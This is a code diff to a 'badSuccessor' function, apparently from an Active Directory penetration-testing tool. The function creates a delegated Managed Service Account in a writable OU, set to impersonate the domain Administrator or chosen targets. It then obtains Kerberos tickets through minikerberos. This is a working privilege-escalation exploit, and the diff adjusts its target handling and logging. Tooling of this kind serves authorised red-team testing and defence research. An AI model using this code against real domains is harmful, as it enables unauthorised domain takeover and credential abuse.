@@ -40,8 +40,10 @@ def badSuccessor(conn, dmsa: str, t: list = ["CN=Administrator,CN=Users,DC=Curre
     if int(schema_version[0]) < 91:
         raise BloodyError("Schema version is not 2025. DMSA creation is not supported.")
 
-    if len(t) == 1 and "CN=Administrator,CN=Users,DC=Current,DC=Domain" in t[0]:
+    if len(t) == 1:
         t = ["CN=Administrator,CN=Users," + conn.ldap.domainNC]
+    else:
+        t = t[1:]
 
     # First we try to find a OU where we can add a child object
     # If we don't find one, we will use the first one where we have DACL write on
@@ -95,6 +97,8 @@ def badSuccessor(conn, dmsa: str, t: list = ["CN=Administrator,CN=Users,DC=Curre
     utils.addRight(new_sd, self_sid, access_mask)
 
     dmsa_sama = dmsa + "$"
+    LOG.info(f"[*] Creating DMSA {dmsa_sama} in {ou}")
+    LOG.info(f"[*] Impersonating: {', '.join(t)}")
     attr = {
         "objectClass": ["msDS-DelegatedManagedServiceAccount"],
         "sAMAccountName": dmsa+'$',
@@ -107,8 +111,6 @@ def badSuccessor(conn, dmsa: str, t: list = ["CN=Administrator,CN=Users,DC=Curre
         "userAccountControl": 0x1000
     }
     conn.ldap.bloodyadd(dmsa_dn, attributes=attr)
-    LOG.info(f"[+] DMSA {dmsa_sama} created in {ou}")
-    LOG.info(f"[+] DMSA {dmsa_sama} can now impersonate: {', '.join(t)}")
 
     client = None
     path = dmsa + "_" + "".join(
@@ -120,7 +122,7 @@ def badSuccessor(conn, dmsa: str, t: list = ["CN=Administrator,CN=Users,DC=Curre
         LOG.error(f"python minikerberos-bAD/examples/getS4U2self.py 'kerberos+certstore://{conn.conf.domain}\{conn.conf.username}@192.168.100.5' 'krbtgt/{conn.conf.domain}@{conn.conf.domain}' '{dmsa_sama}@{conn.conf.domain}' --dmsa")
         return
     url = "kerberos+" + splitted_url[1]
-    LOG.debug(f"[+] Using minikerberos url: {url}")
+    LOG.debug(f"[*] Using minikerberos url: {url}")
     try:
         cu = factory.KerberosClientFactory.from_url(url)
         client = cu.get_client_blocking()
